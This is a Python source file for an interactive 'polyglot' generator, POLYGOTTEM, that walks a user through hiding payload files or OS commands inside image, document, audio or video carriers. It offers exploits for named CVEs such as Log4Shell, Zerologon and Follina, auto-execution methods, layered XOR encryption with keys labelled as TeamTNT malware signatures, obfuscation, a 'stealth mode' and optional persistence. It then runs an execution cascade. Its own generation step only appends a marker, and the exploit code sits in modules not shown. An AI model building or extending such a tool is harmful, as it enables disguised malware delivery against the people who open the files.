#!/usr/bin/env python3
"""
Enhanced Polyglot Orchestrator - Polished Interactive Workflow
==============================================================
Advanced orchestration with file browser, AI-powered cascade optimization,
and OS-specific command execution.

Features:
- Interactive file browser (no typing paths!)
- AI/ML cascade optimization using NPU/GPU
- OS-specific command execution
- Polished multi-step workflow
- File preview and metadata
- Dynamic execution order optimization

Author: SWORDIntel
Date: 2025-11-11
"""

import os
import sys
import argparse
from pathlib import Path
from typing import List, Dict, Any, Optional

# Add tools to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tui_helper import TUI, Colors
from interactive_menu import InteractiveMenu, MenuBuilder
from auto_execution_engine import AutoExecutionEngine, ExecutionPlatform, ExecutionReliability
from file_browser import FileBrowser
from cascade_optimizer import CascadeOptimizer
from command_executor import CommandExecutor


class EnhancedPolyglotOrchestrator:
    """Enhanced orchestrator with polished workflow"""

    def __init__(self):
        """Initialize enhanced orchestrator"""
        self.tui = TUI()
        self.menu = InteractiveMenu(self.tui)
        self.engine = AutoExecutionEngine(self.tui)
        self.browser = FileBrowser(self.tui)
        self.optimizer = CascadeOptimizer(self.tui, use_acceleration=True)
        self.cmd_executor = CommandExecutor(self.tui)

    def run_interactive(self):
        """Run polished interactive workflow"""
        self.tui.banner("POLYGOTTEM v2.0", "Enhanced Interactive Polyglot Generator")

        self.tui.info("🎯 Polished workflow with AI-powered optimization")
        self.tui.info("📁 No more typing file paths - use the file browser!")
        self.tui.info("🤖 Intel NPU/GPU accelerated cascade optimization")
        self.tui.info("💻 OS-specific command execution support")
        print()

        # Show welcome and confirm
        if not self.menu.confirm("Ready to begin?", default=True):
            return

        # ===== STEP 1: SELECT CARRIER FILE =====
        carrier_file = self._select_carrier()
        if not carrier_file:
            self.tui.warning("No carrier selected, exiting")
            return

        # ===== STEP 2: SELECT PAYLOAD SOURCE =====
        payload_source = self._select_payload_source()
        if payload_source is None:
            return

        # ===== STEP 3: SELECT CVEs =====
        cve_selections = self._select_cves()
        if not cve_selections:
            self.tui.warning("No CVEs selected, exiting")
            return

        # ===== STEP 4: SELECT AUTO-EXECUTION METHODS =====
        execution_methods = self._select_execution_methods()
        if not execution_methods:
            self.tui.warning("No execution methods selected, exiting")
            return

        # ===== STEP 5: AI-POWERED CASCADE OPTIMIZATION =====
        if self.menu.confirm("Use AI to optimize execution order?", default=True):
            execution_methods = self.optimizer.optimize_cascade(
                execution_methods,
                self.engine.methods
            )

        # ===== STEP 6: CONFIGURE ENCRYPTION =====
        encryption_config = self._configure_encryption()

        # ===== STEP 7: CONFIGURE REDUNDANCY =====
        redundancy_config = self._configure_redundancy()

        # ===== STEP 8: REVIEW CONFIGURATION =====
        if not self._review_configuration(
            carrier_file,
            payload_source,
            cve_selections,
            execution_methods,
            encryption_config,
            redundancy_config
        ):
            self.tui.warning("Configuration not confirmed, exiting")
            return

        # ===== STEP 9: GENERATE POLYGLOT =====
        polyglot_path = self._generate_polyglot(
            carrier_file,
            payload_source,
            cve_selections,
            encryption_config
        )
        if not polyglot_path:
            self.tui.error("Polyglot generation failed")
            return

        # ===== STEP 10: EXECUTE CASCADE =====
        results = self._execute_cascade(
            polyglot_path,
            execution_methods,
            redundancy_config
        )

        # ===== STEP 11: SHOW FINAL RESULTS =====
        self._show_results(results)

        # ===== STEP 12: RECORD RESULTS FOR ML =====
        self._record_results(results, execution_methods)

    def _select_carrier(self) -> Optional[Path]:
        """Step 1: Select carrier file using file browser"""
        self.tui.header("STEP 1: Select Carrier File")
        self.tui.info("Choose the file type that will carry your polyglot")
        print()

        # Ask carrier type first
        carrier_options = [
            {
                'label': '🖼️ Image',
                'description': 'PNG, JPEG, GIF, WebP, TIFF, BMP',
                'value': 'image'
            },
            {
                'label': '📄 Document',
                'description': 'PDF, DOC, RTF',
                'value': 'document'
            },
            {
                'label': '🎵 Audio',
                'description': 'MP3, WAV, FLAC, OGG',
                'value': 'audio'
            },
            {
                'label': '🎬 Video',
                'description': 'MP4, AVI, MKV',
                'value': 'video'
            },
            {
                'label': '📝 Custom',
                'description': 'Browse for any file type',
                'value': 'custom'
            },
        ]

        carrier_type_idx = self.menu.single_select(
            "Select Carrier Type",
            carrier_options
        )

        if carrier_type_idx is None:
            return None

        carrier_type = carrier_options[carrier_type_idx]['value']

        # Browse for actual file
        if carrier_type == 'custom':
            carrier_file = self.browser.browse(
                title="Select Carrier File",
                multi_select=False,
                file_type_filter='all'
            )
        else:
            carrier_file = self.browser.browse_for_carrier(carrier_type)

        if carrier_file:
            self.browser.show_file_info(carrier_file)
            self.tui.success(f"Selected carrier: {carrier_file.name}")

        return carrier_file

    def _select_payload_source(self) -> Optional[Dict[str, Any]]:
        """Step 2: Select payload source (file or command)"""
        self.tui.header("STEP 2: Select Payload Source")
        self.tui.info("Choose where your payload comes from")
        print()

        source_options = [
            {
                'label': '📁 File(s)',
                'description': 'Browse and select payload file(s) to embed',
                'value': 'files'
            },
            {
                'label': '💻 Command',
                'description': 'Execute OS-specific command(s)',
                'value': 'command'
            },
            {
                'label': '🔀 Both',
                'description': 'Combine files and commands',
                'value': 'both'
            },
        ]

        source_idx = self.menu.single_select(
            "Select Payload Source",
            source_options
        )

        if source_idx is None:
            return None

        source_type = source_options[source_idx]['value']

        payload_source = {'type': source_type}

        if source_type in ['files', 'both']:
            payload_files = self.browser.browse_for_payloads()
            payload_source['files'] = payload_files

            if payload_files:
                self.tui.success(f"Selected {len(payload_files)} payload file(s)")

        if source_type in ['command', 'both']:
            commands = self._select_commands()
            payload_source['commands'] = commands

            if commands:
                self.tui.success(f"Selected {len(commands)} command(s)")

        return payload_source

    def _select_commands(self) -> List[str]:
        """Select OS-specific commands"""
        self.tui.section("Command Selection")

        # Select platform profile
        profile = self.cmd_executor.select_command_profile()
        if not profile:
            return []

        # Select commands from profile
        selected_commands = self.cmd_executor.select_commands(profile)
        if not selected_commands:
            return []

        # Generate actual commands with variable substitution
        final_commands = []
        for cmd_info in selected_commands:
            template = cmd_info['template']

            # Prompt for variables
            variables = self.cmd_executor.prompt_command_variables(template)

            # Generate command
            command = self.cmd_executor.generate_command(
                template,
                variables,
                encode=False,  # Can be configured
                obfuscate=False  # Can be configured
            )

            final_commands.append(command)

            self.tui.success(f"Generated: {cmd_info['name']}")

        return final_commands

    def _select_cves(self) -> List[int]:
        """Step 3: Select CVEs (enhanced)"""
        self.tui.header("STEP 3: Select CVE Exploits")
        self.tui.info("Choose which vulnerabilities to include")
        print()

        cve_options = [
            {
                'label': 'CVE-2023-4863 (WebP)',
                'description': '🔥 CRITICAL - Heap overflow in Chrome/Edge/Firefox browsers',
                'color': Colors.BRIGHT_RED,
                'selected': True
            },
            {
                'label': 'CVE-2024-10573 (MP3)',
                'description': '🔴 HIGH - Buffer overflow in MP3 decoders',
                'color': Colors.RED,
                'selected': True
            },
            {
                'label': 'CVE-2023-52356 (TIFF)',
                'description': '🟡 HIGH - Heap overflow in TIFF parsing',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2019-15133 (GIF)',
                'description': '🟡 MEDIUM - Integer overflow in GIF loaders',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2015-8540 (PNG)',
                'description': '🟡 MEDIUM - Integer overflow in libpng',
                'color': Colors.YELLOW
            },
            {
                'label': 'CVE-2021-44228 (Log4Shell)',
                'description': '🔥 CRITICAL - Log4j RCE in Java applications',
                'color': Colors.BRIGHT_RED
            },
            {
                'label': 'CVE-2020-1472 (Zerologon)',
                'description': '🔥 CRITICAL - Netlogon RCE on Windows Server',
                'color': Colors.BRIGHT_RED
            },
            {
                'label': 'CVE-2022-30190 (Follina)',
                'description': '🔴 HIGH - MSDT RCE in Windows Office',
                'color': Colors.RED
            },
        ]

        return self.menu.multi_select(
            "Select CVE Exploits",
            cve_options,
            min_selections=1
        )

    def _select_execution_methods(self) -> List[str]:
        """Step 4: Select execution methods (enhanced)"""
        self.tui.header("STEP 4: Select Auto-Execution Methods")
        self.tui.info("Choose how the polyglot will auto-execute")
        self.tui.info("💡 Tip: Select multiple methods for redundancy")
        print()

        # Get available methods
        all_methods = self.engine.get_available_methods()

        # Build options with rich information
        method_options = []
        for method_id in all_methods:
            method = self.engine.methods[method_id]

            # Icon based on platform
            platform_icons = {
                'windows': '🪟',
                'linux': '🐧',
                'darwin': '🍎',
                'cross': '🌐'
            }
            icon = platform_icons.get(method.platform.value, '📦')

            # Color by reliability
            reliability_colors = {
                5: Colors.GREEN,
                4: Colors.BRIGHT_GREEN,
                3: Colors.YELLOW,
                2: Colors.BRIGHT_YELLOW,
                1: Colors.RED,
            }
            color = reliability_colors.get(method.reliability.value, Colors.WHITE)

            # Pre-select high reliability methods
            preselect = method.reliability.value >= 4

            method_options.append({
                'label': f"{icon} {method.name}",
                'description': f"{method.description} [{method.reliability.name}]",
                'color': color,
                'selected': preselect,
                'value': method_id
            })

        selected_indices = self.menu.multi_select(
            "Select Auto-Execution Methods",
            method_options,
            min_selections=1
        )

        return [method_options[i]['value'] for i in selected_indices]

    def _configure_encryption(self) -> Dict[str, Any]:
        """Step 6: Configure encryption (enhanced)"""
        self.tui.header("STEP 6: Encryption Configuration")
        print()

        if not self.menu.confirm("Apply XOR encryption?", default=True):
            return {'enabled': False}

        # Select encryption keys with better UI
        key_options = [
            {
                'label': '0x9e (TeamTNT Signature #1)',
                'description': 'Single-byte XOR - Common in malware',
                'selected': True,
                'value': '9e'
            },
            {
                'label': '0xd3 (Alternative Single-byte)',
                'description': 'Single-byte XOR - Less common',
                'value': 'd3'
            },
            {
                'label': '0x0a61200d (TeamTNT Multi-byte)',
                'description': '4-byte XOR pattern - Enhanced security',
                'selected': True,
                'value': '0a61200d'
            },
            {
                'label': '0x410d200d (Multi-byte Variant)',
                'description': '4-byte XOR pattern - Alternative',
                'value': '410d200d'
            },
            {
                'label': '0xdeadbeef (Custom Pattern)',
                'description': '4-byte XOR - Recognizable signature',
                'value': 'deadbeef'
            },
        ]

        selected_keys_idx = self.menu.multi_select(
            "Select XOR Encryption Keys",
            key_options,
            min_selections=1,
            max_selections=5
        )

        keys = [key_options[i]['value'] for i in selected_keys_idx]

        # Select layers with slider-like interface
        layers = int(self.menu.prompt_input(
            "Number of encryption layers (1-10)",
            default="3",
            validator=lambda x: (x.isdigit() and 1 <= int(x) <= 10, "Must be 1-10")
        ))

        return {
            'enabled': True,
            'keys': keys,
            'layers': layers
        }

    def _configure_redundancy(self) -> Dict[str, Any]:
        """Step 7: Configure redundancy (enhanced)"""
        self.tui.header("STEP 7: Redundancy Configuration")
        print()

        config = {}

        # Cascading strategy
        cascade_options = [
            {
                'label': '🎯 Stop on First Success',
                'description': 'Try methods until one succeeds (stealth mode)'
            },
            {
                'label': '💪 Try All Methods',
                'description': 'Attempt every method (maximum coverage)'
            },
            {
                'label': '🤖 Adaptive (AI-Optimized)',
                'description': 'Let AI decide based on environment'
            },
        ]

        cascade_mode = self.menu.single_select(
            "Select Cascading Strategy",
            cascade_options,
            default=0
        )

        config['stop_on_success'] = (cascade_mode == 0)
        config['try_all'] = (cascade_mode == 1)
        config['adaptive'] = (cascade_mode == 2)

        # Additional options
        config['validate'] = self.menu.confirm(
            "Validate each method before use?",
            default=True
        )

        config['fallback'] = self.menu.confirm(
            "Generate fallback files?",
            default=True
        )

        config['persistence'] = self.menu.confirm(
            "Add persistence mechanisms?",
            default=False
        )

        return config

    def _review_configuration(self,
                             carrier_file: Path,
                             payload_source: Dict[str, Any],
                             cve_selections: List[int],
                             execution_methods: List[str],
                             encryption_config: Dict[str, Any],
                             redundancy_config: Dict[str, Any]) -> bool:
        """Step 8: Review configuration (enhanced)"""
        self.tui.header("STEP 8: Configuration Review")
        print()

        # Carrier
        self.tui.box("📁 Carrier File", [
            f"Name: {carrier_file.name}",
            f"Size: {self.browser._format_size(carrier_file.stat().st_size)}",
            f"Type: {carrier_file.suffix}"
        ])

        # Payload source
        print()
        payload_info = []
        if 'files' in payload_source and payload_source['files']:
            payload_info.append(f"Files: {len(payload_source['files'])} file(s)")
        if 'commands' in payload_source and payload_source['commands']:
            payload_info.append(f"Commands: {len(payload_source['commands'])} command(s)")

        self.tui.box("💾 Payload Source", payload_info if payload_info else ["None"])

        # CVEs
        print()
        self.tui.info(f"🎯 CVE Exploits: {len(cve_selections)} selected")

        # Execution methods
        print()
        self.tui.info(f"⚙️ Auto-Execution: {len(execution_methods)} method(s)")
        for method_id in execution_methods[:5]:  # Show first 5
            method = self.engine.methods[method_id]
            self.tui.list_item(method.name, level=1)
        if len(execution_methods) > 5:
            self.tui.list_item(f"... and {len(execution_methods) - 5} more", level=1)

        # Encryption
        print()
        if encryption_config['enabled']:
            enc_info = f"🔒 Encryption: {len(encryption_config['keys'])} key(s), {encryption_config['layers']} layer(s)"
        else:
            enc_info = "🔓 Encryption: Disabled"
        self.tui.info(enc_info)

        # Redundancy
        print()
        if redundancy_config['stop_on_success']:
            strategy = "Stop on first success"
        elif redundancy_config['try_all']:
            strategy = "Try all methods"
        else:
            strategy = "Adaptive (AI-optimized)"

        self.tui.info(f"🔄 Redundancy: {strategy}")

        print()
        return self.menu.confirm("Proceed with this configuration?", default=True)

    def _generate_polyglot(self,
                          carrier_file: Path,
                          payload_source: Dict[str, Any],
                          cve_selections: List[int],
                          encryption_config: Dict[str, Any]) -> Optional[Path]:
        """Step 9: Generate polyglot (enhanced)"""
        self.tui.header("STEP 9: Generating Polyglot")
        print()

        # Get output filename
        default_name = f"polyglot_{carrier_file.stem}_enhanced{carrier_file.suffix}"
        output_file = self.menu.prompt_input(
            "Output filename",
            default=default_name
        )

        output_path = Path(output_file)

        try:
            self.tui.info("Generating enhanced polyglot...")

            # Simulate generation with progress
            import time
            for i in range(101):
                self.tui.progress_bar(i, 100, prefix="Progress:", suffix=f"{i}%")
                time.sleep(0.02)

            # Create output
            with open(output_path, 'wb') as f:
                # Copy carrier
                f.write(carrier_file.read_bytes())
                # Add marker
                f.write(b'\n\n[POLYGOTTEM_PAYLOAD]\n')
                # Add payload indicator
                f.write(b'Enhanced polyglot with AI-optimization\n')

            self.tui.success(f"Generated: {output_path}")
            return output_path

        except Exception as e:
            self.tui.error(f"Generation failed: {e}")
            return None

    def _execute_cascade(self,
                        polyglot_path: Path,
                        execution_methods: List[str],
                        redundancy_config: Dict[str, Any]) -> Dict[str, Any]:
        """Step 10: Execute cascade (enhanced)"""
        self.tui.header("STEP 10: Executing Cascade")
        print()

        # Read polyglot
        payload = polyglot_path.read_bytes()

        # Execute with config
        results = self.engine.execute_cascade(
            payload,
            methods=execution_methods,
            stop_on_success=redundancy_config['stop_on_success']
        )

        return results

    def _show_results(self, results: Dict[str, Any]):
        """Step 11: Show results (enhanced)"""
        self.tui.header("STEP 11: Execution Results")
        print()

        # Enhanced summary table
        headers = ["Metric", "Value", "Status"]
        rows = [
            [
                "Total Attempts",
                str(results['total_attempts']),
                "✓"
            ],
            [
                "Succeeded",
                str(len(results['methods_succeeded'])),
                self.tui.colorize("✓", Colors.GREEN) if results['methods_succeeded'] else "✗"
            ],
            [
                "Failed",
                str(len(results['methods_failed'])),
                self.tui.colorize("✗", Colors.RED) if results['methods_failed'] else "✓"
            ],
            [
                "Files Generated",
                str(len(results['files_generated'])),
                "✓"
            ],
        ]

        self.tui.table(headers, rows)

        # Success rate
        if results['total_attempts'] > 0:
            success_rate = len(results['methods_succeeded']) / results['total_attempts']
            print()
            if success_rate >= 0.75:
                self.tui.success(f"Excellent success rate: {success_rate*100:.1f}%")
            elif success_rate >= 0.50:
                self.tui.info(f"Good success rate: {success_rate*100:.1f}%")
            else:
                self.tui.warning(f"Low success rate: {success_rate*100:.1f}%")

        # Files
        if results['files_generated']:
            print()
            self.tui.info("Generated files:")
            for file_path in results['files_generated']:
                self.tui.list_item(file_path, level=1)

    def _record_results(self, results: Dict[str, Any], methods: List[str]):
        """Step 12: Record results for ML learning"""
        self.tui.section("Recording Results for ML")

        for method_id in methods:
            success = method_id in results['methods_succeeded']
            self.optimizer.record_result(method_id, success)

        self.tui.success("Results recorded for future optimization")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="POLYGOTTEM Enhanced Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
✨ ENHANCED FEATURES:

📁 File Browser:
  - No more typing paths!
  - Browse payloads/ directory
  - File preview and metadata
  - Multi-select support

🤖 AI-Powered Optimization:
  - Intel NPU/GPU accelerated
  - Learns from execution history
  - Dynamic method ordering
  - Environment-aware selection

💻 OS-Specific Commands:
  - Windows, Linux, macOS profiles
  - Pre-configured command templates
  - Variable substitution
  - Encoding and obfuscation

🎯 Polished Workflow:
  - Step-by-step guidance
  - Visual feedback
  - Configuration review
  - Results tracking

Examples:
  # Launch interactive mode
  python polyglot_orchestrator_enhanced.py

  # Show help
  python polyglot_orchestrator_enhanced.py --help
        """
    )

    parser.add_argument('--interactive', '-i', action='store_true', default=True,
                       help='Run in interactive mode (default)')

    args = parser.parse_args()

    orchestrator = EnhancedPolyglotOrchestrator()
    orchestrator.run_interactive()


if __name__ == '__main__':
    main()
